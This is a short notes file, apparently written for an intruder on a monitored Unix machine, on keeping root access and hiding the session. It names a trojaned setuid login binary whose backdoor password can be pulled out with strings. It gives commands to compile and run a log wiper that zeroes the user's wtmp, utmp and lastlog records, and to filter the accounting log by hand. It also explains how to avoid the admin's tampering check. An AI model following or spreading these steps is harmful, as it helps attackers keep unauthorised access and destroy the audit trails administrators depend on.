notes -- clean this dir before you log off (you never do)

* this box gets WATCHED.  the admin reviews `last` and the connect-time billing
  (/var/account/awtmp) on a timer.  if your session still shows, you're traced.

* root's still easy: the login is trojaned and setuid -- check it:
      ls -l /usr/bin/login
  run it and give the word.  forgot the word?  it's baked into the binary:
      strings /usr/bin/login

* covering up (do this as root, in THIS order, before you drop):
      cc -o zap zap.c
      ./zap <your-login-name>          # wipes wtmp + utmp + lastlog (zeroes, in place)
  then the billing log BY HAND (zap doesn't touch it):
      grep -v <your-login-name> /var/account/awtmp > /tmp/a
      mv /tmp/a /var/account/awtmp

* zero the records -- do NOT rm or truncate the logs.  an empty wtmp is its own
  alarm; the admin's sweep treats a blanked log as tampering and calls it in.
